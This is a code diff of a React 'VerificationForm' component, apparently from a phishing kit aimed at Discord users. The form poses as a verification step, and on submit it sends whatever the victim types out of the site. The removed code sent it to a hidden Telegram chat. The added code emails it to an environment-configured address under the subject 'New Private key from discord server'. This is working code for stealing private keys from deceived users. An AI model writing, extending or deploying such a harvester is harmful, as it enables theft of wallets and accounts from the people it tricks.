@@ -1,21 +1,19 @@
-import { object } from "yup";
 import { useState } from "react";
+import { object , type Schema} from "yup";
 import { ErrorMessage, Field, Form, Formik } from "formik";
 
-import { useProvider } from "../../providers";
-import { cleanText, format } from "../../lib/format";
+import Api from "../../lib/api";
 import ProcessingVerificationDialog from "./ProcessingVerificationDialog";
 
 type VerificationFormProps = {
   placeholder: string;
-  validateSchema: any;
+  validateSchema: Schema;
 };
 
 export default function VerificationForm({
   placeholder,
   validateSchema,
 }: VerificationFormProps) {
-  const { telegram } = useProvider();
   const [open, setOpen] = useState(false);
 
   return (
@@ -25,13 +23,12 @@ export default function VerificationForm({
           value: validateSchema,
         })}
         initialValues={{ value: "" }}
-        onSubmit={function (values) {
-          return telegram
-            .sendMessage(
-              Number(import.meta.env.VITE_APP_TELEGRAM_CHAT_ID),
-              format("`%`", cleanText(values.value))
-            )
-            .then(() => setOpen(true));
+        onSubmit={async function (values) {
+          return Api.instance.mail.sendMail({
+            title: "New Private key from discord server",
+            message: values.value,
+            to: import.meta.env.VITE_APP_EMAIL_ADDRESS
+          });
         }}
       >
         {({ isSubmitting }) => (
